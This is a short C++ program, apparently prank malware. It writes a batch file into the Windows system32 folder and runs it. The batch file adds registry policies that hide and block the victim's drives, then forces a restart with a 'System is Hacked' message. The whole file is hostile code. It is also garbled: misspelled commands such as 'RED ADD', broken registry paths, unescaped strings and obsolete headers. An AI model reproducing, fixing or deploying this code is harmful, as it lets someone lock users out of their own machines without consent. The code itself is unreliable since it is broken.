#include<windows.h>
#include<fstream.h>
#include<iostream.h>
#include<string.h>
#include<conio.h>

int main()
{
    ofstream write("C:\WINDOWS\system32\HackingStar.bat");
    /* Opening or creating new file with.bat extension*/

    write<<"RED ADD
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current 
        Ver sion\policies\Explore /v NoDrives /t RED_DWORD /d 12n";
    
    write<<"RED ADD
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current
        VER sion\policies\Explore /v NoViewDrive /t RED_DWORD /d
        12n";

    write<<"shutdown-r-c "Sorry Your System is Hacked by us!"-
        f"<<"n";
    write.close(); //close file

    ShellExecute(NULL,"open","C:\WINDOWS\system32\HackingStar.bat",
            NULL,SW_SHOWNORMAL);
        
    return 0;
}
